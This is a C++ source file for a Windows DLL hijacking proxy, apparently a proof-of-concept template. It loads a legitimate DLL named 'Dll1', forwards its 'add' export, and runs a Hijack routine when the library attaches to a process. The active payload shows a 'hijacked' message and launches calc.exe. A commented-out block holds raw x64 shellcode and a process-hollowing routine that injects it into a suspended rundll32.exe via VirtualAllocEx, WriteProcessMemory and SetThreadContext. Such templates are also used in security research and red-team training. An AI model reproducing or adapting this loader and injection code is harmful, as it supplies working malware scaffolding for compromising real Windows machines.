# include "pch.h"


# define EXTERNC extern "C"
# define NAKED __declspec(naked)
# define EXPORT EXTERNC __declspec(dllexport)
# define ALCPP EXPORT NAKED
# define ALSTD EXTERNC EXPORT NAKED void __stdcall
# define ALCFAST EXTERNC EXPORT NAKED void __fastcall
# define ALCDECL EXTERNC NAKED void __cdecl



namespace DLLHijacker
{
	HMODULE m_hModule = NULL;
	DWORD m_dwReturn[17] = { 0 };

	inline BOOL WINAPI Load()
	{
		TCHAR tzPath[MAX_PATH];
		lstrcpy(tzPath, TEXT("Dll1"));
		m_hModule = LoadLibrary(tzPath);
		if (m_hModule == NULL)
			return FALSE;
		return (m_hModule != NULL);
	}

	FARPROC WINAPI GetAddress(PCSTR pszProcName)
	{
		FARPROC fpAddress;
		CHAR szProcName[16];
		fpAddress = GetProcAddress(m_hModule, pszProcName);
		if (fpAddress == NULL)
		{
			if (HIWORD(pszProcName) == 0)
			{
				wsprintf((LPWSTR)szProcName, L"%d", pszProcName);
				pszProcName = szProcName;
			}
			ExitProcess(-2);
		}
		return fpAddress;
	}
}

using namespace DLLHijacker;

VOID Hijack()   //default open a calc.
{
	MessageBox(0, L"hijacked", L"TITLE", 0);
	WinExec("cmd.exe /c calc.exe", SW_SHOWNORMAL);
	/*
	unsigned char shellcode_calc[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";

	TCHAR CommandLine[] = TEXT("c:\\windows\\system32\\rundll32.exe");

	CONTEXT Context; // [sp+0h] [bp-324h]@2
	struct _STARTUPINFOA StartupInfo; // [sp+2CCh] [bp-58h]@1
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+310h] [bp-14h]@1
	LPVOID lpBaseAddress; // [sp+320h] [bp-4h]@

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = 68;
	if (CreateProcess(0, CommandLine, 0, 0, 0, 0x44, 0, 0, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation)) {
		Context.ContextFlags = 65539;
		GetThreadContext(ProcessInformation.hThread, &Context);
		lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x800u, 0x1000u, 0x40u);
		WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &shellcode_calc, 0x800u, 0);
		Context.Eip = (DWORD)lpBaseAddress;
		SetThreadContext(ProcessInformation.hThread, &Context);
		ResumeThread(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
	}
	*/
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);
		if (Load())
		{

			Hijack();

		}

	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

ALCDECL Hijack_add(void)
{
	__asm POP m_dwReturn[0 * TYPE long];
	GetAddress("add")();
	__asm JMP m_dwReturn[0 * TYPE long];
}

